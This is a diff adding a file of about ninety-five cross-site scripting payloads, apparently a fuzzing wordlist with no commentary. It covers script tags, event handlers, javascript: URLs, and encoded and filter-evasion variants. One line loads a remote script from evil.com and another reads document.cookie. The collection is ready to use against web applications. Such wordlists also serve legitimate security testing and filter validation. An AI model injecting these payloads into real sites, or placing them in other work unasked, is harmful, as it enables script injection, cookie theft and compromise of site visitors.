@@ -1,0 +1,95 @@
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<object data=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+javascript:alert(1)
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+'><svg onload=alert(1)>
+\"><script>alert(1)</script>
+\'/><script>alert(1)</script>
+</script><script>alert(1)</script>
+</style><script>alert(1)</script>
+</title><script>alert(1)</script>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<IMG SRC=x OnErRoR=alert(1)>
+<IMG SRC=x onerror="alert(1)">
+<IMG SRC="javascript:alert(1)">
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG """><SCRIPT>alert(1)</SCRIPT>">
+%3Cscript%3Ealert(1)%3C%2Fscript%3E
+%3Cimg+src%3Dx+onerror%3Dalert(1)%3E
+&lt;script&gt;alert(1)&lt;/script&gt;
+&#60;script&#62;alert(1)&#60;/script&#62;
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+<script>alert(document.cookie)</script>
+<script>alert(document.domain)</script>
+<script src=//evil.com/x.js></script>
+<link rel=stylesheet href=javascript:alert(1)>
+<style>@import 'javascript:alert(1)'</style>
+<div style="background:url(javascript:alert(1))">
+<table background="javascript:alert(1)">
+<math><mi//xlink:href="data:x,<script>alert(1)</script>">
+<form><button formaction=javascript:alert(1)>click
+<isindex action=javascript:alert(1) type=image>
+<base href="javascript:alert(1);//">
+onmouseover=alert(1) x="
+autofocus/onfocus=alert(1)//
+-alert(1)-
+';alert(1);//
+\';alert(1);//
+\x3cscript\x3ealert(1)\x3c/script\x3e
+\u003cscript\u003ealert(1)\u003c/script\u003e
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<script>setTimeout('alert(1)',0)</script>
+<script>setInterval('alert(1)',9999999)</script>
+<script>window['alert'](1)</script>
+<script>top['alert'](1)</script>
+<script>(alert)(1)</script>
+<script>a=alert,a(1)</script>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<input type=image src onerror=alert(1)>
+<video src=x onerror=alert(1)>
+<source src=x onerror=alert(1)>
+<track src=x onerror=alert(1)>
+<script>alert`1`</script>
+<img src onerror=alert`1`>
+<script>Function('alert(1)')();</script>
+<script>new Function('alert(1)')();</script>
+<noscript><p title="</noscript><script>alert(1)</script>">
+<!--<img src="--><img src=x onerror=alert(1)//">
+<comment><img src="</comment><img src=x onerror=alert(1)//">
+<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
+<?xml version="1.0" encoding="UTF-8"?><html><script>alert(1)</script></html>
+<script>location='javascript:alert(1)'</script>
+<script>document.write('<img src=x onerror=alert(1)>')</script>
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<frameset><frame src="javascript:alert(1)">
+<iframe srcdoc="<script>alert(1)</script>">
+<svg><script>alert(1)</script></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<math><mtext></math><script>alert(1)</script>
+<table><td background="javascript:alert(1)">
+<div/onmouseover='alert(1)'>text</div>
+<a href="javascript:void(0)" onmouseover="alert(1)">hover</a>
+<div id="x" style="display:block;width:100px;height:100px" onclick="alert(1)">click</div>
+<img/src="x"/onerror="alert(1)">
+<img src=1 href=1 onerror="javascript:alert(1)">
+<img src=`x`onerror=alert(1)>
